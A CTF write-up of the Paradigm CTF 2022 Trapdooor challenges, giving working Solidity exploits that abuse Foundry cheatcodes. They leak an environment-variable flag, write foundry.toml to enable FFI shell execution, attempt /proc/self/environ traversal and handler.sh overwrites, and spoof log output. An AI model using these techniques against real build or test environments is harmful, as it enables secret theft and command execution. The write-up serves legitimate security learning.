@@ -1,0 +1,705 @@
+# Paradigm CTF 2022 - Trapdooor & Trapdoooor
+
+<p className="text-xs text-right">August 23, 2022 by [patrickd](/about#patrickd)</p>
+
+When building complex puzzles, unintended solutions can get overlooked. [Paradigm CTF](https://ctf.paradigm.xyz/)'s Trapdooor Challenge had a lot of potential for these and offered a deep rabbithole to dive into...
+
+
+## Introducing: Trapdooor
+
+>DESCRIPTION: In theoretical computer science and cryptography, a trapdoor function is a function that is easy to compute in one direction, yet difficult to compute in the opposite direction (finding its inverse) without special information, called the "trapdoor".
+
+When I tackled Trapdooor, the second version (with an additional o) of this Challenge was already released mentioning that players had found a backdoor. The ZIP file of the updated version was password protected, so it wasn't possible to look for this backdoor by comparing them but it gave a big hint: There's probably a much easier unintended way to solve this Challenge.
+
+The Challenge's structure was quite different from the others. While there's still the usual *chal.py* script to set things up, there was no *Setup.sol* this time. Instead, there's a *Script.sol* and those familiar with Foundry should quickly realize that this is nothing supposed to be deployed anywhere. These scripts are only executed locally within a development environment, removing the need to switch between different languages during development.
+
+```python filename="snippet from chal.py"
+runtime_code = input("runtime bytecode: ")
+
+try:
+    binascii.unhexlify(runtime_code)
+except:
+    print("runtime code is not hex!")
+    return 1
+
+with tempfile.TemporaryDirectory() as tempdir:
+    with open("./Script.sol", "r") as f:
+        script = f.read()
+
+    a = number.getPrime(128)
+    b = number.getPrime(128)
+    script = script.replace("NUMBER", str(a * b)).replace("CODE", runtime_code)
+
+    with open(f"{tempdir}/Script.sol", "w") as f:
+        f.write(script)
+
+    p = subprocess.run(
+        args=[
+            "/root/.foundry/bin/forge",
+            "script",
+            "Script.sol",
+            "--tc",
+            "Script",
+        ],
+        cwd=tempdir,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+    )
+
+    print()
+
+    if p.returncode != 0:
+        print("failed to run script")
+        return 1
+
+    result = p.stdout.decode("utf8").strip().split("\n")[-1].strip()
+
+    print(result)
+    if result.startswith("you factored the number!"):
+        print(FLAG)
+```
+
+These are the most significant parts of the python script that is executed every time we'll call into the Challenge (using the `nc 34.68.217.8 31337` command):
+
+1. It asks for hex-encoded runtime bytecode
+2. Checks whether the provided hex is valid
+3. Reads the same *Script.sol* file that we were provided with
+4. Generates two 128 bit prime numbers
+5. Multiplies both numbers and replaces the string `NUMBER` in the code with the result
+6. Replaces the string `CODE` in *Script.sol* with our hex-encoded bytecode
+7. Writes this updated version to a random temporary directory (usually located at /tmp)
+8. Runs the updated script with `forge script Script.sol --tc Script`
+9. Checks whether the process' return-code was successful (aborts if forge exited with an error)
+10. Gets the last line from the forge stdout (what it would output to screen)
+11. Prints the last line
+12. Checks whether this last line starts with the string `"you factored the number!"`, and if so, the Challenge's `FLAG` will be printed
+
+```solidity filename="Script.sol"
+interface FactorizorLike {
+    function factorize(uint) external pure returns (uint, uint);
+}
+
+contract Deployer {
+    constructor(bytes memory code) { assembly { return (add(code, 0x20), mload(code)) } }
+}
+
+contract Script {
+    function run() external {
+        uint expected = NUMBER;
+
+        FactorizorLike factorizer = FactorizorLike(address(new Deployer(hex"CODE")));
+        (uint a, uint b) = factorizer.factorize(expected);
+
+        if (a > 1 && b > 1 && a != expected && b != expected && a != b && expected % a == 0 && expected % b == 0) {
+            console.log("you factored the number! %d * %d = %d", a, b, expected);
+        } else {
+            console.log("you didn't factor the number. %d * %d != %d", a, b, expected);
+        }
+    }
+}
+```
+
+In *Script.sol* we can find the NUMBER and CODE placeholders.
+
+When run, the bytecode that we provided is deployed via the `Deployer` contract. The assembly in its constructor will ensure that our runtime bytecode is returned and deployed instead of the original `Deployer`'s runtime bytecode (which would be pretty much empty since it has no functions).
+
+Then the `factorize()` function is called on our deployed bytecode and it is supposed to return two numbers. Basically, we're supposed to find the original two numbers that were multiplied resulting in `NUMBER` and to ensure we didn't cheat several checks are done.
+
+If the checks pass and the script determines that we found the correct factors we get the message that the python script is looking for. Otherwise we'll get a negative message. It's interesting how the two numbers that our script found are returned as part of both log messages. Since the last message is printed we'll be able to see the numbers that our bytecode ended up picking.
+
+```solidity filename="Script.sol"
+library console {
+    address constant CONSOLE_ADDRESS = address(0x000000000000000000636F6e736F6c652e6c6f67);
+
+    function _sendLogPayload(bytes memory payload) private view {
+        uint256 payloadLength = payload.length;
+        address consoleAddress = CONSOLE_ADDRESS;
+        assembly {
+            let payloadStart := add(payload, 32)
+            let r := staticcall(gas(), consoleAddress, payloadStart, payloadLength, 0, 0)
+        }
+    }
+
+    function log(string memory p0, uint256 p1, uint256 p2, uint256 p3) internal view {
+        _sendLogPayload(abi.encodeWithSignature("log(string,uint,uint,uint)", p0, p1, p2, p3));
+    }
+}
+```
+
+
+If you haven't used foundry yet, you might have heard about the `console.log()` feature from Hardhat before, they're basically the same in Foundry. But normally you don't reimplement the console library like it's done here, you simply import it from [forge-std](https://book.getfoundry.sh/forge/forge-std).
+
+
+## Initial Considerations
+
+**Why isn't it using the official *forge-std* console.log library?**
+
+A quick check in the official [GitHub repository](https://github.com/foundry-rs/forge-std/blob/master/src/console.sol) shows that, aside from missing all the other `log()` function versions, the `_sendLogPayload()` function is exactly the same. So it's unlikely that there's an issue with it. So maybe this is hinting that we need to somehow interfere with the logging?
+
+**Are the number checks correctly implemented?**
+
+If you've heard about RSA encryption you might know that its security is based on the fact that two really large, pseudo-random prime numbers multiplied yield a product with the following features: It can only be divided by either of the prime numbers, by itself and by one. The checks in the script ensure that we are only allowed to return both prime numbers. I can't see a problem with the checks.
+
+**Is the randomness of python's `getPrime()` predictable?**
+
+Numbers that computers generate are always pseudo-random. So they are somewhat predictable in theory but as far as I understand you usually need to know a sample of generated random numbers to be able to predict the next one. But we're never told the primes that were chosen, only the product. And if the challenge would require us to predict random numbers I'd expect it to be tagged with CRYPTO instead of PWN.
+
+**Can the verification of the hex-encoded bytecode be bypassed?**
+
+If that was possible, we could break out of the `hex"CODE"` string, `console.log()` the success message and then end the function before the checks are executed. It would basically allow us to rewrite the code:
+
+```solidity
+contract Script {
+    function run() external {
+        uint expected = NUMBER;
+
+        FactorizorLike factorizer = FactorizorLike(address(new Deployer(hex"/*Injections starts */00")));
+        console.log("you factored the number!", 0, 0, 0);
+    }
+
+    function rest() external {
+        FactorizorLike factorizer = FactorizorLike(address(new Deployer(hex"00/* Injection ends */")));
+        (uint a, uint b) = factorizer.factorize(expected);
+
+        if (a > 1 && b > 1 && a != expected && b != expected && a != b && expected % a == 0 && expected % b == 0) {
+            console.log("you factored the number! %d * %d = %d", a, b, expected);
+        } else {
+            console.log("you didn't factor the number. %d * %d != %d", a, b, expected);
+        }
+    }
+}
+```
+
+I was unable to find a way to make `unhexlify()` accept any non-hex input though and Internet search didn't give me a hint on how to do that either.
+
+**Can we manipulate the order of messages?**
+
+Since only the last line from the script's output is actually checked, we should be able to solve the Challenge by either
+
+* printing the success message and then somehow suppressing the failure message
+* logging the success message and then somehow re-order them to make it print last
+* somehow hooking into the print of the failure message and printing a success afterwards
+
+I tried various terminal escape characters and other special chars to manipulate the order in which the messages are displayed. And one actually worked, but only in a terminal - it didn't fool the python script, likely because the escape characters have no impact there and are simply read like any other:
+
+```solidity
+console.log(unicode"you factored the number! \u001b[5A", 0, 0, 0);
+```
+
+The above will output a special control character that'll tell a console to move the cursor 5 lines up. So after our success message is printed, it'll print the failure message above it.
+
+**Can we make use of cheatcodes?**
+
+Once you enter this rabbit hole, it's hard to come back out...
+
+
+## Enter: Cheatcodes
+
+Foundry didn't entirely reinvent the wheel: When they wanted to add convenient logging, they re-implemented what Hardhat and DappTools already had on offer. When they needed cheats, they used what HEVM had already come up with.
+
+[Cheatcodes](https://book.getfoundry.sh/forge/cheatcodes) are basically functions of a "special contract", located at a special address that do magical things. They only work in the context of the local chain, but they're very useful during testing.
+
+This was the beginning of scrolling through the [list of cheatcodes](https://book.getfoundry.sh/cheatcodes/) over and over again:
+
+**Function mocking?**
+
+```solidity
+// Mocks a call to an address, returning specified data.
+//
+// Calldata can either be strict or a partial match, e.g. if you only
+// pass a Solidity selector to the expected calldata, then the entire Solidity
+// function will be mocked.
+function mockCall(address, bytes calldata, bytes calldata) external;
+```
+
+When I stumbled on this one, I was pretty sure that I found the solution: We can just make the address return static data instead of executing the actual function!
+
+```solidity
+cheat.mockCall(0x000000000000000000636F6e736F6c652e6c6f67, abi.encodePacked(bytes4(keccak256("log(string,uint,uint,uint)"))), hex"00");
+```
+
+This didn't have any effect at all though! Weird.
+
+**Timestamp manipulation?**
+
+```solidity
+// Set block.timestamp
+function warp(uint256) external;
+
+// Set block.number
+function roll(uint256) external;
+```
+
+Maybe the output of the logs is sorted and if we change the timestamp or blocknumber between the messages they'll be re-ordered? – Nope.
+
+**Overwriting bytecode?**
+
+```solidity
+// Sets an address' code
+function etch(address who, bytes calldata code) external;
+```
+
+Although I doubt that the "magic logging address" has anything to do with actual binary code, maybe overwriting it with code that always reverts has any impact?
+
+```solidity
+cheat.etch(0x000000000000000000636F6e736F6c652e6c6f67, hex"FE");
+```
+
+Nope.
+
+**FFI?**
+
+```solidity
+// Performs a foreign function call via terminal
+function ffi(string[] calldata) external returns (bytes memory);
+```
+
+FFI sounds fancy but it's quite simple: It allows you executing shell commands via a Solidity Script. Sounds dangerous? Well, I guess that's why it's turned off by default. There's nothing here implying that it has been turned on. No *foundry.toml* file and the python script doesn't pass **--ffi** as a parameter. Even so, I gave it a quick test... Nope.
+
+**Environment variables?**
+
+I was so sure about `mockCall()` being the solution that I got somewhat desperate at this point. I mean, mocking is a quite good metaphor for a trapdoor, right? Still though, it really felt like there's a lot more potential in this long list of cheatcodes, so I started seriously considering them one-by-one.
+
+```solidity
+// Set environment variables, (name, value)
+function setEnv(string calldata, string calldata) external;
+
+// Read environment variables, (name) => (value)
+function envBool(string calldata) external returns (bool);
+function envUint(string calldata) external returns (uint256);
+function envInt(string calldata) external returns (int256);
+function envAddress(string calldata) external returns (address);
+function envBytes32(string calldata) external returns (bytes32);
+function envString(string calldata) external returns (string memory);
+function envBytes(string calldata) external returns (bytes memory);
+```
+
+Wait.. environment variables.. wasn't there something...
+
+```python filename="from chal.py"
+FLAG = os.getenv("FLAG", "PCTF{placeholder}")
+```
+
+AH! This must be the backdoor to the trapdoor!
+
+
+## Exploiting the Backdoor
+
+The *chal.py* script gets the Challenge flag from the `FLAG` environment variable. And Foundry has a cheatcode that allows us to read environment variables. And thanks to the failure message printing `a` and `b` returned by our bytecode we can leak it to us.
+
+```solidity
+contract Script {
+    function run() external {
+        uint expected = 1;
+
+        //FactorizorLike factorizer = FactorizorLike(address(new Deployer(hex"CODE")));
+        FactorizorLike factorizer = FactorizorLike(address(new Factorizer()));
+        (uint a, uint b) = factorizer.factorize(expected);
+
+        if (a > 1 && b > 1 && a != expected && b != expected && a != b && expected % a == 0 && expected % b == 0) {
+            console.log("you factored the number! %d * %d = %d", a, b, expected);
+        } else {
+            console.log("you didn't factor the number. %d * %d != %d", a, b, expected);
+        }
+    }
+}
+
+interface CheatCodes {
+    function envString(string calldata) external returns (string memory);
+}
+contract Factorizer {
+    function factorize(uint) external returns (uint, uint) {
+        CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+
+        // return (cheat.envInt("FLAG"), 0);
+        // ^ This actually tries to parse the FLAG as a number and will fail...
+
+        string memory flag = cheat.envString("FLAG");
+
+        // return (uint256(bytes32(bytes(flag))), 0);
+        // ^ This will return the FLAG's first 32 bytes as a number:
+        // 36303988286885487241881563943446880517349042511396977973869722935105628174645
+        // Converting this number back to ascii yields:
+        // PCTF{d0n7_y0u_10v3_f1nd1n9_0d4y5
+        // That doesn't look like the complete flag though...
+
+        // Overwrites the flag-string's length to be exactly 2 uint256s large.
+        assembly {
+            mstore(flag, 0x40)
+        }
+        // Now we can abi-decode the string's data as if they were two uints.
+        return abi.decode(bytes(flag), (uint,uint));
+    }
+}
+```
+
+After testing and compiling this locally we can find the runtime bytecode in the artifact json-files contained within the `out` folder.
+
+```bash
+patrickd:~$ nc 34.68.217.8 31337
+1 - factorize
+action? 1
+ticket please: f12d50b10f5157bd63bcd6881d5b956fbb3c4c8d589df1893973e19b6efc
+runtime bytecode: 608060405234801561001057600080fd5b506004361061002b5760003560e01c80631b3abba014610030575b600080fd5b61004361003e36600461011b565b61005c565b6040805192835260208301919091520160405180910390f35b60405163f877cb1960e01b81526000908190737109709ecfa91a80626ff3989d68f67f5b1dd12d908290829063f877cb19906100b390600401602080825260049082015263464c414760e01b604082015260600190565b6000604051808303816000875af11580156100d2573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526100fa919081019061014a565b6040815290506101106060820160208301610214565b935093505050915091565b60006020828403121561012d57600080fd5b5035919050565b634e487b7160e01b600052604160045260246000fd5b6000602080838503121561015d57600080fd5b825167ffffffffffffffff8082111561017557600080fd5b818501915085601f83011261018957600080fd5b81518181111561019b5761019b610134565b604051601f8201601f19908116603f011681019083821181831017156101c3576101c3610134565b8160405282815288868487010111156101db57600080fd5b600093505b828410156101fd57848401860151818501870152928501926101e0565b600086848301015280965050505050505092915050565b6000806040838503121561022757600080fd5b50508051602090910151909290915056fea26469706673582212209952aa68b89e2c28613f48f7a6ca64802654ecdf855629b4a5c4ed02861483ed64736f6c63430008100033
+
+you didn't factor the number. 36303988286885487241881563943446880517349042511396977973869722935105628174645 * 43057057880393007403564109894319249048263545241531721173866963997594434404352 != 53868112551370558747210498588259604202780247092873819607338258524424019764969
+```
+
+Using [eth-toolbox.com](https://eth-toolbox.com/) we can conveniently convert these two leaked numbers to ascii strings:
+
+```plaintext
+36303988286885487241881563943446880517349042511396977973869722935105628174645: PCTF{d0n7_y0u_10v3_f1nd1n9_0d4y5
+43057057880393007403564109894319249048263545241531721173866963997594434404352: _1n_4_c7f}
+```
+
+Solved!
+
+
+## Introducing: Trapdoooor
+
+It's always a good sign when you feel like you've already run out of ideas before you start a new Challenge, oh well.
+
+Having the flag of the first Challenge's version, we're now able to open the archive of the second one. And as you might expect, things are mostly the same except for one significant change:
+
+```diff
+- p = subprocess.run(
+-     args=[
+-         "/root/.foundry/bin/forge",
+-         "script",
+-         "Script.sol",
+-         "--tc",
+-         "Script",
+-     ],
+-     cwd=tempdir,
+-     stdout=subprocess.PIPE,
+-     stderr=subprocess.PIPE,
+- )
++ p = subprocess.Popen(
++     args=[
++         "/root/.foundry/bin/forge",
++         "script",
++         "Script.sol",
++         "--tc",
++         "Script",
++     ],
++     cwd=tempdir,
++     stdout=subprocess.PIPE,
++     stderr=subprocess.PIPE,
++     env={},
++ )
+```
+
+The newly added `env={}` will make sure we won't be ablet to access the system's environment variables.
+
+
+## Digging into Foundry
+
+Not having any other leads, I'm starting to look into one question that is still bugging me: Why did `mockCall()` not work to suppress the failure message's call to the logging address?
+
+The explanation to this question can be found in [*inspector/cheatcodes/mod.rs*](https://github.com/foundry-rs/foundry/blob/master/evm/src/executor/inspector/cheatcodes/mod.rs#L248-L275): Basically various modules in foundry can define `Inspectors` that can hook into the EVM at certain points, such as a CALL being made, and change the EVM behavior. This file deals with catching CALLS made to mocked addresses and returning the mocked data instead of executing the actual code behind it. But before any of that, it checks whether the destination contract is the `HARDHAT_CONSOLE_ADDRESS` and in that case it'll skip this handling entirely.
+
+While exploring the repository I stumbled on something interesting though: In [*executor/abi/mod.rs*](https://github.com/foundry-rs/foundry/blob/7cddec99b41d2a7d8a44df5bb093f8b5acee4c2d/evm/src/executor/abi/mod.rs) where the "abi bindings" for all cheatcodes are defined, I noticed some cheatcodes I had't heard before:
+
+```plaintext
+readFile(string)(string)
+writeFile(string,string)
+openFile(string)
+readLine(string)(string)
+writeLine(string,string)
+closeFile(string)
+removeFile(string)
+```
+
+We can do all this without the FFI flag enabled?
+
+After some more searching I found some documentation on these cheats in [*testdata/cheats/Cheats.sol*](https://github.com/foundry-rs/foundry/blob/6b3db2ad4a7804cf33d40be03d5aaab137805c1b/testdata/cheats/Cheats.sol):
+
+```solidity
+// Reads the entire content of file to string. Path is relative to the project root. (path) => (data)
+function readFile(string calldata) external returns (string memory);
+// Get the path of the current project root
+function projectRoot() external returns (string memory);
+// Reads next line of file to string, (path) => (line)
+function readLine(string calldata) external returns (string memory);
+// Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.
+// Path is relative to the project root. (path, data) => ()
+function writeFile(string calldata, string calldata) external;
+// Writes line to file, creating a file if it does not exist.
+// Path is relative to the project root. (path, data) => ()
+function writeLine(string calldata, string calldata) external;
+// Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.
+// Path is relative to the project root. (path) => ()
+function closeFile(string calldata) external;
+// Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:
+// - Path points to a directory.
+// - The file doesn't exist.
+// - The user lacks permissions to remove the file.
+// Path is relative to the project root. (path) => ()
+function removeFile(string calldata) external;
+```
+
+This doesn't feel like it will lead to the intended solution, but maybe to another backdoor?
+
+
+## Mirages of Backdoors
+
+**No FFI? You don't tell me what to do!**
+
+Remember how I mentioned that FFI is usually turned off by default? Well, now that we know we can write files, can't we just create a config file and flip it on?
+
+```solidity
+interface CheatCodes {
+    function writeFile(string calldata, string calldata) external;
+    function writeLine(string calldata, string calldata) external;
+}
+contract Factorizer {
+    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    function factorize(uint) external returns (uint, uint) {
+        cheat.writeFile("foundry.toml", "[default]\n");
+        cheat.writeLine("foundry.toml", "ffi = true");
+        return (0, 0);
+    }
+}
+```
+
+That definitely does create a file...
+
+```solidity
+interface CheatCodes {
+    function ffi(string[] calldata) external returns (bytes memory);
+}
+contract Factorizer {
+    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    function factorize(uint) external returns (uint, uint) {
+        string[] memory cmds = new string[](2);
+        cmds[0] = "touch";
+        cmds[1] = "PWN";
+        cheat.ffi(cmds);
+        return (0, 0);
+    }
+}
+```
+
+And yes, FFI works now. Huh. It feels like this shouldn't be allowed...
+
+Now that's an interesting finding, but how could we actually exploit it for this challenge? For the new configuration file to become active we need to execute another forge script within the same current-working-directory. And these switch to another temporary directory with each attempt. Seems like a dead end.. too bad!
+
+**Looking for environmental leaks**
+
+Have you heard about `/proc/$PID/environ`? Just like there are special "addresses" in Ethereum to do magical things, there are special "files" in linux that contain all of a process' environment variables.
+
+```solidity
+interface CheatCodes {
+    function readFile(string calldata) external returns (string memory);
+}
+contract Factorizer {
+    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    function factorize(uint) external returns (uint, uint) {
+        cheat.readFile("/../../../../../../../proc/self/environ");
+        return (0, 0);
+    }
+}
+```
+
+But trying to run it...
+
+```plaintext
+Error:
+Path is not allowed.
+```
+
+Right. So I can enable FFI but accessing a system file is asking for too much. C'mon man.
+
+Tried various things to bypass this blacklist, but the only thing I found is this: You can access forbidden paths only if you're already in one. So our script needs to be executed somewhere within /proc for us to be able to access that "file". Another dead end..
+
+**Info please?**
+
+If you spend a lot of time in the [Paradigm CTF 2021](https://github.com/paradigmxyz/paradigm-ctf-2021) GitHub Repository, you might remember there being "*info.yaml*" files in each Challenge's directory:
+
+```yaml
+name: babycrypto
+author: samczsun
+flag: PCTF{5H0uldve_Re4d_rfC_6979}
+tags: ["crypto"]
+description: |
+  I've written a super simple program to sign some data. Hopefully I didn't mess anything up!
+```
+
+Now wouldn't it be convenient if we could access them?
+
+```
+FROM gcr.io/paradigmxyz/ctf/eth-base:latest
+
+COPY deploy/ /home/ctf/
+
+RUN true \
+    && /root/.foundry/bin/forge script /home/ctf/Empty.sol \
+    && true
+```
+
+According to the *Dockerfile* for this challenge however, they'd be out of reach. Only files contained in */public/deploy/* are being copied and the *info.yaml* would be just outside of *public*...
+
+**Attempting total pwnage**
+
+Now that we have already spent some time on how a Challenge's environment is set-up.. might as well go all the way!
+
+Each of the Challenges is running within a container based on *gcr.io/paradigmxyz/ctf/eth-base:latest*. We can fetch ourselves a copy of this Docker image and explore it a bit.
+
+```
+patrickd@cloudshell:~$ docker pull gcr.io/paradigmxyz/ctf/base:latest
+...
+patrickd@cloudshell:~$ docker run -it --name=paradigm-ctf gcr.io/paradigmxyz/ctf/base:latest bash
+
+root@61b3352a8d31:/# ls
+bin  boot  dev  entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  startup  sys  tmp  usr  var
+
+root@61b3352a8d31:/# cat entrypoint.sh
+#!/bin/bash
+for f in /startup/*; do
+    echo "[+] running $f"
+    bash "$f"
+done
+tail -f /var/log/ctf/*
+
+root@61b3352a8d31:/# ls startup/
+00-create-xinetd-service  99-start-xinetd
+
+root@61b3352a8d31:/# cat startup/00-create-xinetd-service
+#!/bin/bash
+cat <<EOF > /etc/xinetd.d/ctf
+service ctf
+{
+    type            = UNLISTED
+    flags           = NODELAY
+    disable         = no
+    socket_type     = stream
+    protocol        = tcp
+    wait            = no
+    user            = ctf
+    log_type        = FILE /var/log/ctf/xinetd.log
+    log_on_success  = PID HOST EXIT DURATION
+    log_on_failure  = HOST ATTEMPT
+    port            = ${PORT}
+    bind            = 0.0.0.0
+    server          = /home/ctf/handler.sh
+    per_source      = ${PER_SOURCE:-4}
+    cps             = ${CPS_RATE:-200} ${CPS_DELAY:-5}
+    rlimit_cpu      = ${RLIMIT_CPU:-5}
+}
+EOF
+
+root@61b3352a8d31:/# cat startup/99-start-xinetd
+#!/bin/bash
+xinetd -filelog /var/log/ctf/xinetd.log
+
+root@61b3352a8d31:/# cat /home/ctf/handler.sh
+#!/bin/bash
+cd /home/ctf
+python3 -u chal.py
+```
+
+Interesting. So every time we call into a Challenge via `nc`, the *xinetd* service will start a `/home/ctf/handler.sh` script and that will in turn run the actual *chal.py*.
+
+Now, it would be really nice to be able to overwrite any of the files involved and execute our own little leak-the-flag-service, but even if we could bypass Foundry's path blacklist there's a problem: *xinetd* is configured to run each request under the user *ctf* and all of the interesting files belong to *root* and are not writable for anyone else.
+
+```solidity
+contract Factorizer {
+    function factorize(uint) external returns (uint, uint) {
+        CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+        cheat.writeLine("../../../../../home/ctf/handler.sh", "read -p 'pwnd ' -n 15 -r; if [[ $REPLY =~ ^backdooooooooor$ ]]; then echo $FLAG; fi");
+        return (0, 0);
+    }
+}
+```
+
+Well, I tried anyway! Turns out that the home directory wasn't blacklisted by foundry and this worked locally. But the real deal was prevented by file permissions, as expected.
+
+(Now that I'm writing this, I'm wondering whether I could've written to `/home/ctf/.bashrc` to execute arbitrary commands each time a script runs... Hmmm...)
+
+
+## Circling Back
+
+At this point, I was completely out of ideas and went back to where I started. This is when I realized that there was still another question to answer: Although we now know why `mockCall()` didn't work, why did setting the logger address' bytecode to revert not cause a revert?
+
+The answer made me facepalm:
+
+```solidity
+function _sendLogPayload(bytes memory payload) private view {
+    uint256 payloadLength = payload.length;
+    address consoleAddress = CONSOLE_ADDRESS;
+    assembly {
+        let payloadStart := add(payload, 32)
+        let r := staticcall(gas(), consoleAddress, payloadStart, payloadLength, 0, 0)
+    }
+}
+```
+
+Because the status `r` returned by `staticcall()` is never checked (it's probably just there to suppress compiler warnings). So even if it reverts, we'd never notice... But doesn't that mean that we might be able to execute bytecode here after all?
+
+After reading the Foundry source, I now know that the log-call is being handled by an `Inspector` at [*/executor/inspector/logs.rs*](https://github.com/foundry-rs/foundry/blob/6b6456c941ab556f340618ccd422406519f51a10/evm/src/executor/inspector/logs.rs#L60-L62). These are basically pre-hooks and executed before normal EVM behavior. So the failure message will be logged first and only after that, the EVM will continue on. So if we use the `etch()` cheatcode to set bytecode for the logging-address that makes another log-call but with the success message, then we should have the correct order to solve this challenge?
+
+
+## The (intended?) Solution
+
+```solidity
+contract Script {
+    function run() external {
+        uint expected = 1;
+
+        //FactorizorLike factorizer = FactorizorLike(address(new Deployer(hex"CODE")));
+        FactorizorLike factorizer = FactorizorLike(address(new Factorizer()));
+        (uint a, uint b) = factorizer.factorize(expected);
+
+        if (a > 1 && b > 1 && a != expected && b != expected && a != b && expected % a == 0 && expected % b == 0) {
+            console.log("you factored the number! %d * %d = %d", a, b, expected);
+        } else {
+            console.log("you didn't factor the number. %d * %d != %d", a, b, expected);
+        }
+    }
+}
+
+interface CheatCodes {
+    function etch(address who, bytes calldata code) external;
+}
+contract Factorizer {
+    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    function factorize(uint) external returns (uint, uint) {
+        // Copies this contracts bytecode to the Hardhat Logging Address.
+        cheat.etch(0x000000000000000000636F6e736F6c652e6c6f67, address(this).code);
+        return (0, 0);
+    }
+    fallback() external {
+        // We're not implementing log(string,uint,uint,uint) directly because that
+        // wouldn't work with Solidity which uses the full name for uint types:
+        // log(string,uint256,uint256,uint256) resulting in a different signature.
+        // So instead: A fallback() as catch-all function.
+        console.log("you factored the number! %d * %d = %d", 0, 0, 0);
+    }
+}
+```
+
+This actually ends up creating an infinite loop, but that's no issue since it'll run out of gas and errors are being ignored anyway.
+
+```plaintext
+ubuntu@eth$ forge script Script.sol --tc Script
+[⠊] Compiling...
+[⠢] Compiling 1 files with 0.8.16
+[⠆] Solc 0.8.16 finished in 61.13ms
+Compiler run successful
+Script ran successfully.
+Gas used: 1246540
+
+== Logs ==
+  you didn't factor the number. 0 * 0 != 1
+  you factored the number! 0 * 0 = 0
+  you factored the number! 0 * 0 = 0
+  you factored the number! 0 * 0 = 0
+  ...
+  you factored the number! 0 * 0 = 0
+  you factored the number! 0 * 0 = 0
+  you factored the number! 0 * 0 = 0
+```
+
+After copying the bytecode from the build artifact in */out* we can paste it into the challenge server. The python script will be able to find that the last line of stdout started with "*you factored the number!*" and we get a FLAG as a reward.
+
+What a journey.
